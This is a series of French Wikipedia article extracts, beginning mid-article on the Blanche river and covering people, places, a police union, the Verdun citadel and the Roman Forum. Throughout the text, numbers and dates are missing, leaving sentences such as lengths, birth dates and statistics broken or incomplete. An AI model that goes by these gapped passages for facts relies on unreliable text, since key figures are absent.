Elle prend sa source sur les pâturages de la Grande Montagne, au pied de Rocheclose sur la commune de Seyne, dans les Alpes-de-Haute-Provence et rejoint la Durance dans le bassin de compensation du barrage de Serre-Ponçon sur le territoire de la commune de La Bréole près d'Espinasses.
La longueur de son cours est de et son bassin versant recouvre au confluent avec la Durance.
Communes et cantons traversés.
La Blanche donne son nom à la Vallée de la Blanche et traverse deux départements, six communes et trois cantons.
Bassin versant.
La Blanche traverse une seule zone hydrographique (X050) de de superficie. Ce bassin versant est constitué à 90,38 % de , à 7,77 % de , à 1,05 % de , à 0,77 % de , à 0,02 % de 
Organisme gestionnaire.
L'organisme gestionnaire est le SMAVD ou Syndicat mixte d'aménagement de la vallée de la Durance.
Affluents.
La Blanche a huit affluents contributeurs :
Rang de Strahler.
Le rang de Strahler est donc de quatre.
Hydrologie.
La Blanche est une rivière qui transporte beaucoup de matériaux, environ par an. Son cône de déjection occupe une superficie de et a un volume de 
Son débit de crue décennale (Q10) est de ; lors d'une crue centennale, elle peut atteindre les .

</doc>
<doc id="1873817" url="https://fr.wikipedia.org/wiki?curid=1873817" title="Robert Alazraki">
Robert Alazraki

Robert Alazraki est un directeur de la photographie français. Il est enseignant à l’école supérieure des arts visuels de Marrakech au Maroc
Biographie.
Robert Alazraki a été l'un des vice-présidents de l'AFC (Association française des directeurs de la photographie cinématographique).

</doc>
<doc id="1873820" url="https://fr.wikipedia.org/wiki?curid=1873820" title="Comtes de Comminges">
Comtes de Comminges



</doc>
<doc id="1873823" url="https://fr.wikipedia.org/wiki?curid=1873823" title="Moustapha Abou al-Yazid">
Moustapha Abou al-Yazid

Moustapha Abou al-Yazid ( - ), également connu sous le pseudonyme de Cheikh Saïd al-Masri (سعيد المصري : Saïd l'égyptien), est un islamiste égyptien, un ex-activiste du Djihad islamique égyptien et l'un des plus hauts responsables de la nébuleuse terroriste Al-Qaïda. Considéré par certains comme le n°3 de la mouvance terroriste, il était, depuis août 2007, le leader d'Al-Qaïda en Afghanistan selon un enregistrement vidéo diffusé par Al Jazeera. Il est ciblé à quatre reprises par des drones américains. Frappes qui ont provoqué la mort de 46 civils. 
Biographie.
Selon Yasser al-Sirri, directeur de l'Observatoire islamique, basé à Londres, il naît en Égypte le dans la région d'Al-Sharqiya, dans le delta du Nil. Il se tourne très tôt vers l'islam radical et participe à la fondation du Djihad islamique égyptien avec son compatriote Ayman al-Zawahiri, le et principal idéologue de la nébuleuse terroriste Al-Qaïda. À la suite de l'implication du Djihad islamique dans l'assassinat du président égyptien Anouar el-Sadate le , Masri est arrêté et écope d'une peine de trois ans de prison.
En 1988, Masri quitte l'Égypte pour l'Afghanistan. Il se rapproche d'Oussama Ben Laden et le suit au Soudan en 1991, puis une nouvelle fois en 1996 en Afghanistan. Il est alors chargé de la comptabilité des activités commerciales du chef d'Al-Qaïda.
Selon le FBI, Masri aurait contribué au financement des attentats du 11 septembre 2001 via Dubaï grâce à des comptes bancaires secrets ouverts dans le Golfe Arabo-Persique. 
Mohammed Atta lui a transféré 26 000 dollars peu avant le déclenchement du .
En , un enregistrement vidéo diffusé par Al-Jazeera annonce sa promotion au rang de chef des opérations militaires d'Al-Qaïda en Afghanistan. À partir de cette époque, les services de renseignements américains l'ont considéré comme le de la nébuleuse terroriste. Toutefois, ce titre est réfuté par de nombreux spécialistes, dont certains estiment qu'il était en réalité attribué à Abu Yahya al-Libi, un ex-activiste du Groupe islamique combattant en Libye (GICL), évadé d'une prison de haute sécurité en Afghanistan en 2005 et devenu l'un des plus importants idéologues de la nébuleuse. 
Spécialisé dans la finance et la logistique, Masri se rapproche des Talibans afghans et apprend le pachtoune.
Le , il apparaît dans une vidéo pour commémorer la mort du chef d'Al-Qaïda en Irak, l'Égyptien Abou Hamza Al-Mouhajer ainsi que celle du chef de l'État islamique d'Irak, Abu Abdullah al-Rashid al-Baghdadi.
Décès.
Moustapha Abou al-Yazid est mort le 21 ou au Nord-Waziristan lors de l'attaque d'un drone de combat américain. Le , Al-Qaïda confirme son décès, précisant que plusieurs membres de sa famille ont péri dans l'attaque.

</doc>
<doc id="1873825" url="https://fr.wikipedia.org/wiki?curid=1873825" title="Big Bird Stadium">
Big Bird Stadium



</doc>
<doc id="1873826" url="https://fr.wikipedia.org/wiki?curid=1873826" title="Simon Szyszman">
Simon Szyszman

Simon Szyszman (né à Simferopol le et mort à Paris le ) est un auteur et éditeur karaïme moderne.
Né en Crimée, il tente d'émigrer en Égypte en 1945, mais s'installe finalement à Paris.
Il a écrit une œuvre abondante sur les karaïtes. À partir de 1973, il publie plusieurs éditions du "Bulletin d'études karaïtes". Son matériel est d'importance reconnue pour l'histoire karaïte moderne.
Adepte des thèses articulées par Abraham Firkovich et Simha Babovich selon lesquelles les karaïtes européens seraient un peuple d’ethnie tatare distinct du judaïsme, il insiste fermement sur cette distinction et adopte en vieillissant un point de vue de plus en plus hostile au judaïsme, attaquant les auteurs rabbanites sur le karaïsme dès que l’occasion s’en présente. Dans un article de 1989 (« Les Karaïtes sont-ils destinés à être méconnus ? »), il va jusqu'à blâmer les rabbanites pour la « destruction » de la communauté karaïte d'Égypte (qui a émigré en Israël), et pour tous les malheurs que les karaïtes ont subis.
Szyszman ne ménage pas sa critique des karaïtes se définissant comme Juifs (essentiellement les karaïtes d'orient), accusés d'être « peu confiants en leur force », ni son hostilité au sionisme dont les « dirigeants […] cherchent vainement à étouffer [les idées karaïtes] depuis plus de deux mille ans » (le terme « sionisme » désigne ici manifestement les communautés juives en général). Les Juifs rabbanites, toujours désignés par le seul terme de « Juifs », sont aussi régulièrement accusés par l'auteur, par exemple d'avoir « ruiné matériellement » les karaïtes de Pologne et de Lituanie.
Lien interne.
Histoire du karaïsme

</doc>
<doc id="1873827" url="https://fr.wikipedia.org/wiki?curid=1873827" title="Blanche (Pas-de-Calais)">
Blanche (Pas-de-Calais)

La Blanche est un cours d'eau du département du Pas-de-Calais et un sous-affluent de l'Escaut par la Lys. La Blanche n'est pas un affluent de la Lawe, mais la séparation de celle-ci en deux cours d'eau.
Géographie.
La longueur de son cours d'eau est de .
La séparation se fait après le moulin de Gosnay. Les deux branches étaient destinées jusqu'à la fin du à la mise en eau des fortifications de la Ville de Béthune. La Blanche, après Gosnay, traverse Fouquières-lès-Béthune et, après avoir reçu les eaux du Fossé d'Avesnes, rejoint la Lawe au niveau du moulin d'Annezin.
Département traversé : Pas-de-Calais

</doc>
<doc id="1873828" url="https://fr.wikipedia.org/wiki?curid=1873828" title="Blitzkrieg (jeu vidéo)">
Blitzkrieg (jeu vidéo)

Blitzkrieg est un jeu vidéo de tactique en temps réel basé sur les événements de la Seconde Guerre mondiale. Le jeu permet aux joueurs d'assumer le rôle d'officiers commandant durant les batailles de la Seconde Guerre mondiale en Europe et en Afrique du Nord. Chaque pays a ses unités militaires respectives historiquement correctes. De la même façon que les jeux "Sudden Strike", "Blitzkrieg" se concentre davantage sur les batailles que l'aspect de stratégie en temps réel avec la construction de bases.
Les "Blitzkrieg" utilisent le système de protection contre la copie StarForce. "Blitzkrieg Anthology" ne semble cependant pas l'utiliser.
Les graphismes rendent une 3D réaliste et les détails incluent des saisons, les zones climatiques et les conditions de temps qui peuvent affecter la façon de jouer. Le sang est présent bien qu'il puisse être désactivé. Le jeu couvre près de 350 unités et objets différents. Le joueur peut construire des ponts, creuser des tranchées, poser des mines, remplacer ou réparer des unités ou appeler un soutien aérien, mais il n'y a aucun système de gestion de ressource, à part les entrepôts qui peuvent être capturés lorsqu'ils sont présents dans la partie. Virtuellement, tout peut être détruit, même les bâtiments et les ponts. Les forêts peuvent être rasés par les chars et l'artillerie. Chaque unité d'une nation parle leur propre langue, ajoutant ainsi à l'immersion au jeu.
Le jeu est livré avec un éditeur qui permet à l'utilisateur de créer ses propres unités et cartes.
Extensions.
"Blitzkrieg" bénéficie de trois extensions officielles, développées par la société allemande La Plata Studios en collaboration avec Nival Interactive, le développeur du jeu original. Elles ont été éditées par CDV Interactive :
Plusieurs add-ons non officiels sont aussi sortis pour le jeu :
L'équipe de Brendel Software-Systeme est très prolifique en termes d'add-ons, elle compte parmi ses créations :
Intex Publishing a également édité 6 add-on pour le jeu :
Dark Fox est aussi à l'origine de la campagne "Operation North", jamais vendue en France mais disponible en Russie.

</doc>
<doc id="1873830" url="https://fr.wikipedia.org/wiki?curid=1873830" title="Martín Cardetti">
Martín Cardetti

Martín Alejandro Cardetti Renaux, né le à Río Cuarto (Argentine), est un footballeur argentin, qui jouait au poste d'attaquant avant de devenir entraîneur.
Véritable globe-trotter du football, il a connu douze clubs différents au cours de sa carrière. Il a terminé sa carrière en 2011 au Boston River en Uruguay.
Carrière de joueur.
Martín Cardetti a commencé sa carrière à Rosario Central en 1995. Il participe alors à la victoire de son club en copa CONMEBOL.
En 1997 il rejoint le célèbre River Plate où il remporte l'Apertura et la dernière édition de la Supercopa Sudamericana.
Il part pour l'Europe en 1998 à l'UD Salamanque. Cette expérience n'est pas concluante et Cardetti repart à River dès l'année suivante. Il termine meilleur buteur du championnat en 2001. 
En 2002, il retente sa chance en Europe en signant au Paris Saint-Germain. Sous les ordres de Luis Fernandez, le numéro 9 du PSG réalise une saison honnête au cours de laquelle il inscrit 7 buts en championnat. Le plus remarqué d'entre eux est une tête lobée qu'il marque lors du classico face à Marseille (victoire 3-0). Il marque également son seul but en coupe d'Europe lors d'une confrontation face à Újpest (victoire 3-0).
La saison suivante il n'entre pas dans les plans du nouvel entraîneur Vahid Halilhodžić et il est prêté au Real Valladolid.
En 2004 il retourne en Argentine au Racing Club. Il évolue ensuite au Mexique aux Pumas UNAM. Il y dispute alors la Coupe des champions de la CONCACAF. 
Ensuite il revient encore une fois en Argentine au Gimnasia La Plata.
Il évolue ensuite quelques mois en Colombie au Deportivo Cali, puis revient encore en Argentine au Colón Santa Fe. En 2008 il signe à Quilmes où il reste deux saisons.
Martín Cardetti termine sa carrière en 2011 après une dernière expérience dans le club uruguayen de Boston River.
Carrière d'entraîneur.
Martin Cardetti commence sa carrière d'entraîneur dans la foulée à Boston River, en 2011, en duo avec Marcelo Revuelta.
Il est entre et 2016 l'entraîneur du Club Sport Uruguay de Coronado, en première division du Championnat du Costa Rica de football. 
Il est depuis 2018 l'entraîneur de l'AD San Carlos.

</doc>
<doc id="1873834" url="https://fr.wikipedia.org/wiki?curid=1873834" title="Antonio Arenas">
Antonio Arenas

Antonio Arenas Merino, né à Lima le , et mort dans la même ville le , est un homme d'État péruvien.
Durant la Guerre du Pacifique, il est ministre plénipotentiaire chargé des négociations de paix avec le Chili, à Arica. Il est le principal chef du gouvernement du Pérou du au , en attendant de nouvelles élections, à la suite du renversement du dictateur Miguel Iglesias par Andrés Avelino Cáceres. Il exerce alors en parallèle les fonctions de ministre des Relations extérieures.

</doc>
<doc id="1873835" url="https://fr.wikipedia.org/wiki?curid=1873835" title="Comté de Harvey">
Comté de Harvey

Le comté de Harvey est l’un des 105 comtés de l’État du Kansas, aux États-Unis. Fondé le 7 mars 1872, il a été nommé en hommage à James M. Harvey, cinquième gouverneur de l’État.
La prohibition y a été abolie en 1996, par un vote autorisant la vente d'alcool dans les magasins vendant par ailleurs au moins 30 % de nourriture.
Siège et plus grande ville : Newton.

</doc>
<doc id="1873840" url="https://fr.wikipedia.org/wiki?curid=1873840" title="Rupture sociale">
Rupture sociale



</doc>
<doc id="1873841" url="https://fr.wikipedia.org/wiki?curid=1873841" title="Bezness">
Bezness

Bezness () est un film tunisien réalisé en 1992 par Nouri Bouzid.
Synopsis.
Fred, photographe, est en Tunisie pour faire un reportage sur les « bezness » (hommes prostitués). Décalé dans cet univers où l'image est une violation et sa représentation un tabou, il est le protégé de Roufa.
Beau et brun, Roufa vit de son corps. Son rêve : quitter Sousse. L'Europe l'attire et le fascine. Sa morale et son comportement sont doubles. Très permissif avec sa clientèle, il est conservateur et répressif avec les siens, surtout avec Khomsa, sa jeune fiancée. Ce film est le portrait d'une jeunesse aux prises avec les effets pervers du tourisme et confrontée aux contradictions entre traditions et modernité, Orient et Occident.

</doc>
<doc id="1873847" url="https://fr.wikipedia.org/wiki?curid=1873847" title="Syndicat des commissaires de la Police nationale">
Syndicat des commissaires de la Police nationale

Le Syndicat des commissaires de la Police nationale (SCPN-UNSA) est un syndicat français représentant le « corps de conception et de direction de la Police nationale », qui est l'appellation officielle du corps des commissaires de police.
Histoire.
Le SCPN a été fondé en 1925 par les commissaires de police à la suite d'un vote du congrès de l'association professionnelle et après un vote interne. Il s'appelle alors Syndicat des commissaires municipaux, spéciaux et mobiles de la Sûreté générale. Le commissaire Bernard Sansot en est le premier secrétaire général. Les statuts sont déposés à la préfecture de la Seine le .
En 1948, l'organisation devient le Syndicat indépendant des commissaires de police et des fonctionnaires supérieurs de la Sécurité nationale et de l'Union française. En 1968, elle prend le nom de « Syndicat des commissaires de police et des hauts fonctionnaires de la Police nationale » (SCHFPN) ce qui lui a parfois valu le surnom de « Schtroumpf ». En , elle adopte sa dénomination actuelle.
Le le congrès du Syndicat des commissaires de la Police nationale (SCPN) décide à l’unanimité son adhésion à la Fédération générale autonome des fonctionnaires (FGAF). En , le SCPN participe à la création au sein de celle-ci de la Fédération autonome des métiers de l'Intérieur (FAMI) avec Horizon-SGPATSI (syndiquant les personnels administratifs, techniques et infirmiers) et le SNPPS (personnels scientifiques). En , le SCPN et le SNPPS quittent la FGAF pour l'UNSA.
Il devient le SCPN-UNSA en intégrant la FASMI-UNSA avec l'UNSA Police, le SNPPS-UNSA, l'UNSA Officiers, le SPPN-UNSA (Psychologues de la Police Nationale), l'UATS Unsa (Union des Personnels administratifs, Techniques et Spécialisés), l'UNSA SANEER (Syndicat Autonome National des Experts de l’Éducation Routière).
Représentativité.
Le syndicat est traditionnellement très majoritaire dans le corps qu'il représente. En 2001, il obtient 80,03 % des suffrages et 5 sièges en commission administrative paritaire, en 2003, 88,32 % des voix et 6 sièges. Toutefois, lors des élections de 2006, il subit la concurrence d'un nouveau syndicat, le SICP qui obtient 35,79 % des voix et 2 sièges. Le SCPN a donc vu sa représentativité ramené à 58,50 % des suffrages et 3 sièges, la , UNSA Police, réalisant 5,71 %.
Les élections intervenues le ont attribué respectivement 66,20 % des voix au SCPN et 33,80 % des voix au SICP. Le SCPN obtient donc 3 sièges sur 4. UNSA Police n'avait pas présenté de liste. Le SCPN représente seul les commissaires de police au sein du Comité Technique Paritaire Central, au Conseil d'Administration de l'Ecole Nationale Supérieure de la Police Nationale.
Publication.
Le SCPN édite depuis un magazine à destination des hauts fonctionnaires de la police nationale, "La Tribune du commissaire", désormais publiée tous les deux mois sous forme de newsletter numérique. Le syndicat communique également sur les réseaux sociaux sous le compte Twitter @ScpnCommissaire.
Polémiques.
Le 26 novembre 2022, après plusieurs tweets à ce sujet de députés du Rassemblement national et de Reconquête, David Le Bars, secrétaire général du syndicat, appelle sur twitter la Fnac à réagir à la mise en vente sur leur site d'un jeu, "Antifa", qui ferait la promotion de comportements violents en manifestation. Le lendemain, la Fnac s'excusait et retirait l'article de ses rayons et de son site. L’auteur et l’éditeur affirment qu’il n’attente en rien à la légalité et dénoncent une censure. Le , la Fnac décide de proposer de nouveau le jeu à la vente.
Lors de la polémique sur la page wikipedia de la Station hertzienne militaire de Pierre-sur-Haute en 2013, le SCPN évoque, sans que cela engage la DCRI qui avait lancé cette polémique, l'éventualité d'un blocage de l'article par décision judiciaire : , précise le secrétaire général du syndicat, Emmanuel Roux. Reporters sans frontières (RSF) déplorera les actions des autorités françaises en tant que .

</doc>
<doc id="1873848" url="https://fr.wikipedia.org/wiki?curid=1873848" title="Agriculturisme">
Agriculturisme



</doc>
<doc id="1873852" url="https://fr.wikipedia.org/wiki?curid=1873852" title="Jaïr (homonymie)">
Jaïr (homonymie)



</doc>
<doc id="1873853" url="https://fr.wikipedia.org/wiki?curid=1873853" title="Acide carbamique">
Acide carbamique

L'acide carbamique ou acide amidique est un acide de formule . C'est aussi le composé parent de la famille des acides carbamiques de formule générale .
Ce composé est instable dans les conditions standard de température et de pression, contrairement à ses formes estérifiées.

</doc>
<doc id="1873855" url="https://fr.wikipedia.org/wiki?curid=1873855" title="Citadelle souterraine de Verdun">
Citadelle souterraine de Verdun

La citadelle souterraine de Verdun est un ensemble de galeries creusées à la fin du sous la citadelle de Verdun, dans le département de la Meuse en région Grand Est.
La citadelle haute est construite au selon les plans de Jean Errard après la prise de la ville par le roi Henri II en 1552. Une fois la ville définitivement rattachée au royaume de France en 1648, Vauban est chargé d'améliorer ses fortifications. Après la guerre franco-allemande de 1870, la ville rentre dans le système Séré de Rivières et se retrouve au centre de la place fortifiée de Verdun constituée de nombreux forts.
La citadelle souterraine, ou citadelle basse, est creusée à la fin du et cumule de galeries à la fin de la Première Guerre mondiale. Elle sert à la fois de refuge, de poste de commandement et de base de ravitaillement. Le , elle accueille la cérémonie de désignation du Soldat inconnu qui repose sous l'Arc de triomphe de l'Étoile à Paris.
La citadelle est inscrite aux monuments historiques depuis le .
Historique.
Citadelle haute ().
En 1552, le roi de France Henri II prend la ville de Verdun au Saint-Empire romain germanique dans le cadre du « Voyage d'Allemagne ». Il décide de consolider les fortifications médiévales et une citadelle est construite de 1567 à 1634. Mais le chantier n'avance pas à cause des guerres de religion. Il faut attendre 1624, en pleine guerre de Trente Ans, pour que les travaux commencent réellement après que Louis XIII ait demandé au maréchal de Marillac, lieutenant-général des Trois-Évêchés et gouverneur de Verdun, d'achever rapidement les fortifications. Le tracé de la citadelle de 1601 est modifié en 1626. La citadelle s'étend sur sur le mont Saint-Vanne. Les ingénieurs du roi et mathématiciens Pierre de Conty d'Argencour, Jacques Aleaume et Claude Chastillon dirigent la construction selon les plans et principes de l'ingénieur militaire barisien Jean Errard. 
En 1648, le traité de Münster, faisant partie des traités de Westphalie, confirme le rattachement de la cité et de l'évêché de Verdun au royaume de France. Louis XIV confie à l'ingénieur et architecte militaire Vauban le soin d'améliorer la défense de la ville. Les travaux débutent en 1674 et s'arrêtent en 1692 avant de reprendre en 1698. La citadelle compte alors plusieurs bastions, des casernes, un arsenal, un magasin d'artillerie, un magasin à blé, des magasins à poudre...
Après la guerre franco-allemande de 1870, la France met en place le système Séré de Rivières, conçu par le général Raymond Adolphe Séré de Rivières. sont construits autour de la ville, tels que les forts de Vaux, de Souville ou de Douaumont, qui forment la place fortifiée de Verdun.
Citadelle souterraine ().
À la fin du , les ingénieurs militaires, Guinot et Rouillon de Gironville, veulent faire de la citadelle une base logistique. De 1886 à 1893, des galeries sont creusées sous de roches et forment la citadelle souterraine de Verdun (ou citadelle basse en opposition à la citadelle haute). En 1914, les galeries cumulent une longueur de près de , et à la fin de la guerre, elles s'étendent sur .
La citadelle souterraine pouvait accueillir et servait à la fois de refuge, de poste de commandement et de base de ravitaillement. Elle se composait de six magasins à poudre, sept magasins de munitions, une boulangerie, un moulin, un central téléphonique et télégraphique, des machines élévatrices d'eau pour la ville et les forts, des cuisines et de vastes magasins. Lors de la bataille de Verdun de 1916, la citadelle souterraine accueille jusqu'à et les fours à pains produisent de pain par jour.
Choix du Soldat inconnu.
Le , l'Assemblée nationale approuve à l'unanimité un projet de loi visant à déposer sous l'Arc de triomphe de l'Étoile les restes d'un soldat inconnu mort pour la France au cours de la Première Guerre mondiale. Les champs de bataille sont découpés en neuf secteurs : Flandres, Artois, Somme, Marne, Chemin des Dames, Champagne, Verdun, Lorraine et Alsace.
Le , huit cercueils sont acheminés à la citadelle de Verdun. Le neuvième n'est pas retenu car il subsiste un doute sur la nationalité du corps exhumé.
Le , a lieu la cérémonie de désignation du soldat inconnu. Dans une galerie de la citadelle souterraine transformée en chapelle ardente, les cercueils, recouverts d'un drapeau tricolore, sont alignés deux par deux. En présence de nombreux officiels, le ministre des Pensions André Maginot tend un bouquet de fleurs au caporal Auguste Thin. Ce dernier doit désigner le Soldat inconnu en déposant le bouquet sur l'un des cercueils : il choisit le .
Le Soldat inconnu est emmené à Paris tandis que les sept autres cercueils sont transférés à la nécropole nationale du Faubourg-Pavé et forment « le carré des 7 Inconnus ».
Après-guerre.
Le , la citadelle est inscrite aux monuments historiques.
En 2009, le circuit touristique est modernisé, en remplaçant les installations vieillissantes par du matériel technologique neuf.
En 2016, des travaux de rénovation prévus pour le début de l'année sont retardés pour des raisons environnementales et techniques. Il s'agit de mettre en place une nouvelle scénographie utilisant la réalité virtuelle.
Architecture.
La citadelle souterraine est creusée sous de roches et compte de galeries en 1914 et à la fin de la guerre. Cinq galeries principales de 4 à de large sont orientées ouest-est. Elles sont coupées perpendiculairement par quatre galeries de de large dites « d'écoute ».
Elle se compose de six magasins à poudre, sept magasins de munitions, une boulangerie, un moulin, un central téléphonique et télégraphique, des machines élévatrices d'eau pour la ville et les forts, des cuisines et de vastes magasins.
Tourisme.
Visite.
La visite de la citadelle souterraine se fait à bord d'une nacelle audioguidée qui parcourt les galeries et retrace le rôle de la France et de Verdun dans la Première Guerre mondiale.

</doc>
<doc id="1873856" url="https://fr.wikipedia.org/wiki?curid=1873856" title="SCHFPN">
SCHFPN



</doc>
<doc id="1873862" url="https://fr.wikipedia.org/wiki?curid=1873862" title="Aoudh">
Aoudh



</doc>
<doc id="1873865" url="https://fr.wikipedia.org/wiki?curid=1873865" title="Bertrand Crasson">
Bertrand Crasson

Bertrand Crasson, né le à Bruxelles en Belgique, est un footballeur international et entraîneur belge. D'octobre à novembre 2023, il est entraineur remplaçant au PSS Sleman, un club indonésien dont il devient ensuite l'entraineur principal des U18.
Biographie.
Bertrand Crasson commence le football en 1982, au Red Star Evere. Il rejoint le RSC Anderlecht en 1985. Il dispute son premier match en équipe première le . Son poste de prédilection est arrière droit.
Bertrand Crasson a disputé 329 rencontres en belge, y inscrivant 20 buts, et remportant six titres (1991, 1993, 1994, 1995, 2000 et 2001). Il a, également à son palmarès, une Coupe de Belgique (1994). Il a disputé 78 matches européens sous le maillot anderlechtois, inscrivant 3 buts, et 4 rencontres de Coupe Intertoto avec le Lierse SK.
Après sa carrière de joueur, Bertrand Crasson a travaillé comme consultant pour la télévision belge RTBF pour analyser des rencontres du championnat de Belgique. Cette collaboration a cessé après que l'ancien joueur ait connu des soucis d'ordre privé.
Bertrand Crasson a été un des acteurs de la capsule humoristique "Vestiaires" diffusée sur RTBF depuis juin 2010.
Désireux de « changer » et de s'éloigner à la suite de ses soucis privés, Bertrand Crasson s'exile en Thaïlande où il entraîne entre autres pour le club du BEC Tero FC et diverses académies. Au début de l'année 2018, l'ex-international déclare qu'il souhaite retrouver de l'embauche en Europe.
Carrière internationale.
Bertrand Crasson reçoit sa première cape le en étant titularisé lors d'un déplacement en Allemagne ("défaite 1-0"), pour ce qui est la dernière rencontre éliminatoire de la Belgique lors des Qualifications de l'Euro 92. Cette partie est aussi la dernière de Guy Thys comme sélectionneur des "Diables Rouges".
Après une apparition lors d'un amical en France en 1992, le défenseur latéral doit patienter deux ans avant d'intégrer plus régulièrement le giron de l'équipe nationale. Paul Van Himst ne fait pas appel à lui ni en éliminatoires, ni en pohase finale de la World Cup américaine. Par contre, avec le même sélectionneur, on le retrouve lors de quatre matchs des Qualifs de l'Euro 96 et de quelques parties amicales.
C'est à partir de 1996 que Crasson, passé entretemps à Napoli, devient un incontournable des Diables rouges dirigés par Georges Leekens sur le chemin de "France 98". Présent à six reprises dans l'effectif belge, le "back" connait le pire moment de sa carrière internationale lors du mondial français. Titulaire lors de l'entrée en matière de la Belgique contre les Pays-Bas ("0-0"), le "grand Bert" est plusieurs fois mit en boîte par le véloce Marc Overmars. Remplacé après seulement 22 minutes par Éric Deflandre, Crasson ne joue plus lors des deux autres parties des Diables, sanctionnées d'autant de partages et d'une élimination sans gloire au premier tour.
On retrouve Crasson, redevenu Anderlechtois, lors de la Kirin Cup 1999 et lors d'une partie amicale contre...les Pays-Bas, en 2000. Robert Waseige ne reprend pas l'arrière latéral bruxellois dans "les 23" pour l'Euro 2000, mais fait appel à lui à deux reprises pendant les Qualifs de la Coupe du monde 2002.
Crasson ne dispute pas le premier mondial asiatique car il honore sa dernière cape le et une défaite "4-1" en Finlande.
Au total, Bertrand Crasson a été sélectionné à 37 reprises chez les Diables rouges pour 26 capes. Il est l'auteur d'un but, le quand il ouvre le score à l'Arms Park de Cardiff, dans ce qui sera un succès ("1-2") de la Belgique au Pays de Galles, sur le chemin de du mondial 2002.

</doc>
<doc id="1873868" url="https://fr.wikipedia.org/wiki?curid=1873868" title="Personnages de la série Twin Peaks">
Personnages de la série Twin Peaks



</doc>
<doc id="1873871" url="https://fr.wikipedia.org/wiki?curid=1873871" title="Martin Cardetti">
Martin Cardetti



</doc>
<doc id="1873872" url="https://fr.wikipedia.org/wiki?curid=1873872" title="Dépressage">
Dépressage

En sylviculture, le dépressage est une opération consistant à sélectivement supprimer un certain nombre de jeunes sujets dans un peuplement très dense (généralement monospécifique, équienne et issu de semis après une coupe rase ; au stade "gaulis") afin de favoriser le développement des arbres-objectifs ainsi conservés.
Lorsque l'on opère sur une futaie plus mûre, on parle de balivage ou d'éclaircie.
Les jeunes arbres peuvent être coupés (et emportés ou laissés au sol) ou tués par un écorcage annulaire et laissés debout comme source de bois mort.
Exemple.
Dans le cas d'un peuplement dense de Douglas issu de semis, 30 à 50 % des tiges sont ainsi supprimées.
Objectifs.
Dans le cas de la sylviculture intensive, cette opération vise à :
Inconvénients.
Dans un boisement dense, en l'absence de dépressage, il finit par y avoir ;

</doc>
<doc id="1873874" url="https://fr.wikipedia.org/wiki?curid=1873874" title="Forum romain (Rome)">
Forum romain (Rome)

Le Forum romain ou Forum de Rome ("" en italien, en latin), appelé aussi (« Grand Forum ») ou (« Vieux Forum »), est situé dans le site archéologique le plus important de Rome, entre les collines du Capitole et du Mont Palatin.
Le forum est la place principale de la Rome antique. Son importance historique, religieuse et politique en fait l'endroit autour duquel toute la vie de la ville s'articule : célébration de mariages, organisation de jeux, de combats de gladiateurs, de cérémonies et de fêtes religieuses, de défilés militaires (sur la Via Sacra), de proclamations politiques (par exemple lors de la crémation de Jules César, en ce même lieu)… Il est le centre vivant de la ville, à l'image de l'agora, lieu de rassemblement politique et mercantile des cités grecques.
Historique.
À l'origine, entre le Capitole et le mont Palatin, près de la Velia, s’étend une petite plaine marécageuse d'un peu plus de huit hectares inondée régulièrement par le Tibre qui coule non loin. Le marais est alimenté par les eaux qui ruissellent des collines environnantes.
Les premières communautés se sont installées sur les hauteurs environnantes (les « Sabins » sur le Capitole et le Quirinal et les « Latins » sur le Palatin), se servant de la dépression du "forum" comme nécropole. Néanmoins, des vestiges retrouvés sous les temples de César et d'Antonin suggèrent que le village du Palatin s'étendait sur une partie de la vallée.
À partir du , la vallée marécageuse est colonisée et la nécropole est partiellement abandonnée, uniquement réservée aux enfants qui peuvent encore être enterrés au sein de la ville. Les adultes sont dorénavant enterrés sur l'Esquilin, en dehors de la zone urbaine. Au début du , la nécropole archaïque est définitivement abandonnée.
Royauté romaine.
La place du forum est aménagée pour la première fois en 616 av. J.-C. ou peu après, recouverte simplement de terre battue. À partir de cette époque, le forum n'est plus une zone périphérique aux villages (étymologiquement, "forum" signifie « en dehors ») mais devient la place centrale des villages alentour. La datation archéologique correspond aux premiers travaux d'aménagement d'envergure sous les Tarquins, rois étrusques (voir aussi lien Étrusque) de Rome, qui s'établirent là de -616 à -509.
Tarquin l'Ancien fait creuser un système de drainage des eaux vers le Tibre, la "Cloaca Maxima", qui permet d'assécher les marais et d'assainir la zone.
L'aménagement de la vallée du forum présuppose que le village du Palatin a fusionné avec les communautés établies sur le Capitole et le Quirinal. La construction d'un grand temple dédié à Jupiter sur le Capitole par Tarquin le Superbe montre que cette colline fait bien partie de la ville naissante de Rome. Au pied du Palatin sont construites des huttes puis de véritables maisons en bois rectangulaires avec soubassements en pierre. Ces dernières seront incendiées par les Gaulois de Brennus.
La partie du forum plus proche du Capitole, la partie publique, est d'abord divisée en deux sections bien distinctes : au nord, au pied de l'Arx, le "Comitium" devient le centre politique et judiciaire de la ville, tandis que les activités commerciales se concentrent au sud, sur le forum à proprement parler. Cette distinction paraît évidente dès la fin du . Une troisième section apparaît avec la construction de la "Regia", à proximité du temple de Vesta, qui constitue la zone religieuse. Mais la principale fonction du forum semble commerciale. Les rois étrusques s'établissent sur le site car il permet le contrôle des routes commerciales de la région. Dès cette époque apparaissent des boutiques, et le forum devient le lieu où s'effectuent les échanges entre les différentes communautés établies sur les hauteurs.
Le forum républicain.
En -509, la royauté est abolie, laissant place à la République. Cet évènement ne semble pas altérer le développement de la ville. La première modification importante de la topographie du forum intervient avec la construction de deux sanctuaires, l'un dédié à Saturne, et l'autre dédié aux Dioscures, culte importé de Grèce. Le temple de Saturne, dont la construction a peut-être commencé sous la Royauté, se dresse à l'emplacement d'un vieil autel déjà dédié à ce dieu.
La deuxième moitié du est une période méconnue de l'histoire de Rome, et il est difficile d'établir les modifications du lieu durant cette période. Cependant, la tradition rapportée par les auteurs antiques nous apprend que c'est à cette époque, vers -450, qu'est établie la Loi des Douze Tables qui constitue la base du droit romain. Cette loi est inscrite sur des tablettes en bronze fixées sur la tribune des orateurs. C'est vers la même époque que le sol en terre battue et fait de cailloux tassés est dallé pour la première fois.
Vers -390 une armée de Gaulois dirigée par Brennos (Brennus pour les Latins) saccagent et incendient Rome (mais l'étendue des dégâts semble avoir été exagérée par les historiens antiques, les archéologues n'ayant trouvé que peu de traces de cet évènement, ce qui peut aussi être compréhensible, au vu des multiples reconstructions faites en cette ville à différentes époques…).
